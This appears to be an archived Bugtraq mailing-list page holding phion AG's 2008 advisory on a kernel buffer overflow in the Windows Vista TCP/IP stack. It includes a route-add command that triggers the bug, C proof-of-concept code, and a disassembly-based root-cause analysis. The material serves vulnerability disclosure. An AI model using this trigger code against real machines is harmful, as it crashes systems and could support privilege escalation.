@@ -1,0 +1,455 @@
+From: <ÓÉ Windows Internet Explorer 7 ±£´æ>
+Subject: 'Microsoft VISTA TCP/IP stack buffer overflow' - MARC
+Date: Tue, 1 Jun 2010 15:33:31 +0800
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="gb2312"
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://marc.info/?l=bugtraq&m=122711627932563&w=2
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.5931
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE>'Microsoft VISTA TCP/IP stack buffer overflow' - =
+MARC</TITLE>
+<META http-equiv=3DContent-Type content=3D"text/html; charset=3Dgb2312">
+<META content=3D"MSHTML 6.00.6000.17023" name=3DGENERATOR></HEAD>
+<BODY text=3D#000000 vLink=3D#800080 link=3D#0000c0 =
+bgColor=3D#ffffff><PRE><B>[<A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D122711857207086&amp;w=3D2">=
+prev in list</A>] [<A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D122712784223006&amp;w=3D2">=
+next in list</A>] [<FONT color=3D#c0c0c0>prev in thread</FONT>] [<A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D122764880906471&amp;w=3D2">=
+next in thread</A>] </B>
+<B><FONT size=3D+1>
+List:       <A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;r=3D1&amp;w=3D2">bugtraq</A>
+Subject:    <A =
+href=3D"http://marc.info/?t=3D122711628300001&amp;r=3D1&amp;w=3D2">Micros=
+oft VISTA TCP/IP stack buffer overflow</A>
+From:       <A =
+href=3D"http://marc.info/?a=3D122711631700003&amp;r=3D1&amp;w=3D2">Thomas=
+ Unterleitner &lt;t.unterleitner () phion ! com&gt;</A>
+Date:       <A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;r=3D1&amp;w=3D2&amp;b=3D200811"=
+>2008-11-19 16:04:05</A>
+Message-ID: <A =
+href=3D"http://marc.info/?i=3D2A001D0FBC8275479BBB8FA9B5F1AF27025589C49E%=
+20()%20hq-mx01%20!%20phionnet%20!%20com">2A001D0FBC8275479BBB8FA9B5F1AF27=
+025589C49E () hq-mx01 ! phionnet ! com</A></FONT>
+[<A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D122711627932563&amp;q=3Draw=
+">Download message RAW</A>]</B>
+
+phion Security Advisory 21/10/2008=20
+
+Microsoft VISTA TCP/IP stack buffer overflow=20
+
+Summary=20
+-----------------------------=20
+Microsoft Device IO Control wrapped by the iphlpapi.dll API shipping =
+with Windows \
+Vista 32 bit and 64 bit contains a possibly exploitable, buffer overflow =
+corrupting \
+kernel memory.
+
+Affected Systems=20
+-----------------------------=20
+
+Using the sample program it was possible to verify this issue on =
+following operating \
+systems and configurations:
+
+*	Microsoft Windows Vista Enterprise 32 bit &amp; 64 bit
+*	Microsoft Windows Vista Ultimate 32 bit &amp; 64 bit
+
+It is very likely that other versions of Windows Vista are affected by =
+this issue.=20
+
+This issue did not occur on Windows XP.=20
+
+Installation of Service Pack 1 and/or security updates had no effect in =
+regards to \
+resolve the random crashes.
+
+To execute either the sample program or the route-add command, the user =
+has to be \
+member of the Network Configuration Operators group or the =
+Administrators group.=20
+
+Since this buffer overflow overwrites kernel memory, it could be =
+possible that \
+members of the Network Configuration Operator group exploit this and =
+take control \
+over the operating system without any restriction.=20
+
+Impact=20
+-----------------------------=20
+1.	When adding a route entry to the IPv4 routing table using the method =
+\
+CreateIpForwardEntry2 and passing an illegal value greater than 32 <A =
+name=3D-2></A><A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D122711627932563&amp;w=3D2#2=
+">[2]</A> for the \
+destination PrefixLength member in the DestinationPrefix structure =
+contained in the \
+MIB_IPFORWARD_ROW2 structure <A name=3D-3></A><A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D122711627932563&amp;w=3D2#3=
+">[3]</A>, kernel space memory is being corrupted resulting in \
+random blue screen crashes. The crash does not always occur instantly =
+after executing \
+the provided sample program; it may take a while until the corrupted =
+memory is \
+accessed, causing the operating system to crash with a blue screen. It =
+seems that \
+larger illegal values <A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D122711627932563&amp;w=3D2#2=
+">[2]</A> trigger the crash earlier, during research in our labs it \
+proved that passing the illegal values 129 and 255 accelerates the =
+occurrence of the \
+crash.
+
+2.	In addition we were able to reproduce this issue without the sample =
+program, using \
+the built in "route add" command. It seems the "route-add" uses the same =
+method as \
+our sample program, hence creates the same buffer overflow when calling =
+it with an \
+illegal value for the network mask. The syntax we used in the command =
+line is as \
+follows:=20
+
+	  route add 1.2.3.4/240 4.3.2.1
+
+
+This buffer overflow could be exploited to inject code, hence =
+compromising client \
+security.=20
+
+Remedy
+------------=20
+No remedy available from vendor as of November 10, 2008.
+
+Workaround for netfence entegra 1.0 -1.2
+---------------------------------------------------
+For netfence entegra, phion recommends to use the following workaround:
+Install the hotfix provided by phion AG, which is available to all =
+customers and \
+partners for download on the myphion site <A name=3D-4></A><A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D122711627932563&amp;w=3D2#4=
+">[4]</A>. This hotfix will replace the existing \
+vista.dll in the phion installation directory, with the newer version =
+1.0.0.1.
+
+=20
+Reported
+------------=20
+This vulnerability was first reported to Microsoft on, 22nd October 2008 =
+15:20 (GMT \
++2).
+
+Acknowledgements=20
+-----------------------------=20
+This vulnerability has been discovered by Marius Wachtler, Michael =
+Burgbacher, Carson \
+Hounshell, Michael Craggs and Thomas Unterleitner on behalf of phion AG. =
+
+
+Contact Information=20
+-----------------------------=20
+   phion AG can be reached via:=20
+      office@phion.com / <A =
+href=3D"http://www.phion.com/">http://www.phion.com/</A>=20
+
+   Thomas Unterleitner can be reached via:=20
+      t.unterleitner@phion.com
+
+References=20
+-----------------------------=20
+<A name=3D1></A><A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D122711627932563&amp;w=3D2#-=
+1">[1]</A> phion AG - <A =
+href=3D"http://www.phion.com/">http://www.phion.com/</A>=20
+<A name=3D2></A><A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D122711627932563&amp;w=3D2#-=
+2">[2]</A> MSDN IP_ADDRESS_PREFIX  structure - \
+<A =
+href=3D"http://msdn.microsoft.com/en-us/library/aa814439">http://msdn.mic=
+rosoft.com/en-us/library/aa814439</A>(VS.85).aspx <A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D122711627932563&amp;w=3D2#3=
+">[3]</A> MSDN \
+MIB_IPFORWARD_ROW2 - a <A =
+href=3D"http://msdn.microsoft.com/en-">http://msdn.microsoft.com/en-</A> =
+us/library/aa814494(VS.85).aspx \
+<A name=3D4></A><A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D122711627932563&amp;w=3D2#-=
+4">[4]</A> Myphion - <A =
+href=3D"http://www.phion.com/INT/support/Myphion/Pages/default.aspx">http=
+://www.phion.com/INT/support/Myphion/Pages/default.aspx</A>=20
+
+Exploit=20
+-----------------------------=20
+See Appendix A for sample code and Appendix B for research results.
+
+Disclaimer=20
+-----------------------------=20
+There are NO warranties, implied or otherwise, with regard to this =
+information or its \
+use. Any use of this information is at the user's risk. In no event =
+shall the \
+author/distributor (phion AG) be held liable for any damages whatsoever =
+arising out \
+of or in connection with the use or spread of this information. =20
+Appendix A - Sample source code=20
+
+#define _WIN32_WINNT 0x0600
+#define WIN32_LEAN_AND_MEAN
+
+#include &lt;windows.h&gt;
+#include &lt;winsock2.h&gt;
+#include &lt;ws2ipdef.h&gt;
+#include &lt;iphlpapi.h&gt;
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(int argc, char** argv)
+{
+	DWORD			   dwStatus;
+	MIB_IPFORWARD_ROW2 route;
+=09
+	if (argc !=3D 3)
+	{
+		printf("Usage: %s &lt;ifNum&gt; &lt;numOfBits&gt;\n\n", argv<A =
+name=3D-0></A><A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D122711627932563&amp;w=3D2#0=
+">[0]</A>);
+		return -1;
+	}
+
+	InitializeIpForwardEntry(&amp;route);=09
+
+	route.InterfaceIndex =3D atoi(argv<A name=3D-1></A><A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D122711627932563&amp;w=3D2#1=
+">[1]</A>);
+	route.DestinationPrefix.Prefix.si_family =3D AF_INET;
+
+	route.DestinationPrefix.Prefix.Ipv4.sin_addr.s_addr =3D =
+inet_addr("1.2.3.0");=09
+	route.DestinationPrefix.Prefix.Ipv4.sin_family =3D AF_INET;
+
+	route.DestinationPrefix.PrefixLength =3D atoi(argv<A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D122711627932563&amp;w=3D2#2=
+">[2]</A>);
+=09
+	route.NextHop.Ipv4.sin_addr.s_addr =3D inet_addr("11.22.33.44");=09
+	route.NextHop.Ipv4.sin_family	    =3D AF_INET;
+
+	route.SitePrefixLength		=3D 0;
+
+	route.Protocol			=3D MIB_IPPROTO_NETMGMT;	=09
+	route.Origin				=3D NlroManual;
+	route.ValidLifetime		=3D 0xffffffff;
+	route.PreferredLifetime		=3D 0xffffffff;
+	route.Metric				=3D 1;
+=09
+	dwStatus =3D CreateIpForwardEntry2(&amp;route);=20
+	return dwStatus;
+}
+
+
+=20
+Appendix B - Research results=20
+
+After further research we where able to narrow down the issue
+and can provide the reason and location of the buffer overflow.
+
+=3D=3D=3D=3D=3D=3D=3D=3D Summary =3D=3D=3D=3D=3D=3D=3D=3D
+
+The function netio!PtpCreateTrieNode allocates 32 bytes using
+the method ExAllocatePoolWithTag, as a buffer. Next the function
+netio!PtpCopyPartialKeys tries to copy memory into the previously
+allocated buffer using an offset of 24 bytes and the illegal=20
+value as number of bits to be copied. Since this value can be=20
+bigger than 8 bytes the amount of memory copied is greater than
+the buffer, overwriting surrounding kernel memory.=20
+
+
+=3D=3D=3D=3D=3D=3D=3D=3D Parameters =3D=3D=3D=3D=3D=3D=3D=3D
+
+CreateIpForwardEntry2 was called with
+
+DestinationPrefix.Prefix       =3D "1.2.3.4"
+DestinationPrefix.PrefixLength =3D 0xEE
+
+
+=3D=3D=3D=3D=3D=3D=3D=3D Callstack =3D=3D=3D=3D=3D=3D=3D=3D
+
+934b7a00 85a1b1bb 00000020 837100ee 934b7ac4 =
+NETIO!PtpCreateTrieNode+0x20
+934b7a34 85a6211f 842f4ed0 934b7ac4 837100ee NETIO!PtInsertEntry+0x59
+934b7a5c 85aa6fe4 00000000 934b7ac4 837100ee =
+tcpip!IppCreateUnicastRoute+0xf0
+934b7ae8 85a5d121 00000001 858b6278 84d74ce8 \
+tcpip!IppValidateSetAllRouteParameters+0x217 934b7b64 85a18a29 836c134c =
+00000000 \
+92a84a70 tcpip!Ipv4SetAllRouteParameters+0x1d1 934b7ba4 8a844551 =
+00000001 92a326b4 \
+00000000 NETIO!NsiSetAllParametersEx+0xbd 934b7bf0 8a844eb8 00000000 =
+836c1330 \
+836c1378 nsiproxy!NsippSetAllParameters+0x1b1 934b7c14 8a844f91 92a32601 =
+00000000 \
+8371d290 nsiproxy!NsippDispatchDeviceControl+0x88 934b7c2c 818f0053 =
+8590b448 92a32698 \
+92a32698 nsiproxy!NsippDispatch+0x33 934b7c44 81a80515 8371d290 92a32698 =
+92a32708 \
+nt!IofCallDriver+0x63 934b7c64 81a80cba 8590b448 8371d290 0027f700 \
+nt!IopSynchronousServiceTail+0x1d9 934b7d00 81a6a98e 8590b448 92a32698 =
+00000000 \
+nt!IopXxxControlFile+0x6b7 934b7d34 8188ba7a 00000044 00000048 00000000 =
+\
+nt!NtDeviceIoControlFile+0x2a 934b7d34 77529a94 00000044 00000048 =
+00000000 \
+nt!KiFastCallEntry+0x12a 0027f68c 77528444 777214b9 00000044 00000048 \
+ntdll!KiFastSystemCallRet 0027f690 777214b9 00000044 00000048 00000000 \
+ntdll!ZwDeviceIoControlFile+0xc
+
+
+=3D=3D=3D=3D=3D=3D=3D=3D Disassembly with commands =
+=3D=3D=3D=3D=3D=3D=3D=3D
+
+NETIO!PtpCreateTrieNode:
+mov     edi,edi
+push    ebp
+mov     ebp,esp
+push    edi
+mov     edi,dword ptr [ebp+8]
+lea     eax,[ebp+8]
+push    eax
+push    dword ptr [edi+4]
+push    18h
+call    NETIO!RtlULongAdd (85a1675d)
+test    eax,eax
+jl      NETIO!PtpCreateTrieNode+0x1b
+push    esi
+push    74704D4Eh
+push    dword ptr [ebp+8]             ; =3D 0x00000020
+push    0
+call    ExAllocatePoolWithTag         ; eax =3D ExAllocatePoolWithTag(0, =
+0x20, \
+0x74704D4E, esi); mov     esi,eax                       ; =3D 0x83716380 =
+allocated \
+buffer address test    esi,esi
+je      NETIO!PtpCreateTrieNode+0x6d
+push    dword ptr [ebp+8]             ; =3D 0x00000020=09
+push    0
+push    esi                           ; 0x83716380 allocated buffer =
+address
+call    NETIO!memset (85a10543)       ; memset((char*)0x83716380, 0, =
+0x20)
+mov     eax,dword ptr [ebp+14h]
+mov     dword ptr [esi],eax
+mov     eax,dword ptr [ebp+18h]
+mov     dword ptr [esi+0Ch],eax
+mov     dword ptr [eax],esi
+mov     eax,dword ptr [ebp+0Ch]
+and     word ptr [esi+14h],0
+add     esp,0Ch
+push    eax                           ; =3D 0x837100ee=20
+                                      ; the lower word contains our =
+PrefixLength \
+(0x00EE) push    dword ptr [ebp+10h]           ; =3D 0x934b7ac4 contains =
+our ip
+                                      ; 934b7ac4  01 02 03 04 00 00 00 =
+00-00 13 6c 83 \
+                48 7b 4b 93
+                                      ; 934b7ad4  78 62 8b 85 00 13 6c =
+83-48 13 6c 83 \
+                78 00 8b 85
+                                      ; 934b7ae4  b9 9a fb 16 64 7b 4b =
+93-21 d1 a5 85 \
+01 00 00 00 mov     word ptr [esi+16h],ax
+lea     eax,[esi+18h]                 ; esi unchanged, holds the alloc. =
+buffer \
+address (=3D0x83716380) push    eax                           ; =3D =
+0x83716398 add offset \
+of 0x18 bytes to the allocated buffer  call    NETIO!PtpCopyPartialKeys  =
+    ; \
+PtpCopyPartialKeys(0x83716380+0x18, 0x934b7ac4, PrefixLength) inc     =
+dword ptr \
+[edi+8] mov     eax,esi
+pop     esi
+pop     edi
+pop     ebp
+ret     14h
+nop
+nop
+nop
+nop
+nop
+
+
+NETIO!PtpCopyPartialKeys:
+mov     edi,edi
+push    ebp
+mov     ebp,esp
+movzx   eax,word ptr [ebp+10h]        ; =3D 0x00ee  PrefixLength in bits
+add     eax,7
+shr     eax,3
+push    eax                           ; 0x0000001e PrefixLength in bytes
+push    dword ptr [ebp+0Ch]           ; 0x934b7ac4 src buffer
+push    dword ptr [ebp+8]             ; 0x83716398 dst buffer
+                                      ; 83716398  00 00 00 00 00 00 00 =
+00-05 00 06 04 \
+                45 76 65 ee
+                                      ; 837163a8  01 00 00 00 01 00 00 =
+00-78 81 15 83 \
+                00 00 00 00
+                                      ; 837163b8  18 68 f0 8a 00 00 00 =
+00-01 00 04 00 \
+                01 00 00 00
+                                      ; \
+------------------------------------------------------------------ call  =
+  \
+NETIO!memcpy                  ; memcpy(0x83716398, 0x934b7ac4, =
+0x0000001e) // BUFFER \
+                OVERFLOW !!!!
+                                      ; \
+                =
+------------------------------------------------------------------
+                                      ; 83716398  01 02 03 04 00 00 00 =
+00-00 13 6c 83 \
+                48 7b 4b 93
+                                      ; 837163a8  78 62 8b 85 00 13 6c =
+83-48 13 6c 83 \
+                78 00 00 00
+                                      ; 837163b8  18 68 f0 8a 00 00 00 =
+00-01 00 04 00 \
+                01 00 00 00
+                                      ; compare the byte values with the =
+src buffer \
+printed before add     esp,0Ch
+pop     ebp
+ret     0Ch
+neg     ecx
+push    ecx
+
+
+<B>[<A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D122711857207086&amp;w=3D2">=
+prev in list</A>] [<A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D122712784223006&amp;w=3D2">=
+next in list</A>] [<FONT color=3D#c0c0c0>prev in thread</FONT>] [<A =
+href=3D"http://marc.info/?l=3Dbugtraq&amp;m=3D122764880906471&amp;w=3D2">=
+next in thread</A>] </B>
+</PRE><PRE></PRE><BR>
+<CENTER><A href=3D"http://marc.info/?q=3Dconfigure">Configure</A> | <A=20
+href=3D"http://marc.info/?q=3Dabout">About</A> | <A=20
+href=3D"http://marc.info/?q=3Dnews">News</A> | <A=20
+href=3D"http://marc.info/?q=3Dabout#Begware">Donate</A> | <A=20
+href=3D"mailto:webguy@marc.info?subject=3DAdd a list to =
+MARC">Add&nbsp;a&nbsp;list</A>=20
+| Sponsors:&nbsp;<A href=3D"http://www.10east.com/">10East</A>,&nbsp;<A=20
+href=3D"http://www.korelogic.com/">KoreLogic</A>,&nbsp;<A=20
+href=3D"http://www.terra-intl.com/">Terra-International</A>,&nbsp;<A=20
+href=3D"http://www.chakpak.com/">Chakpak.com</A> </CENTER></BODY></HTML>
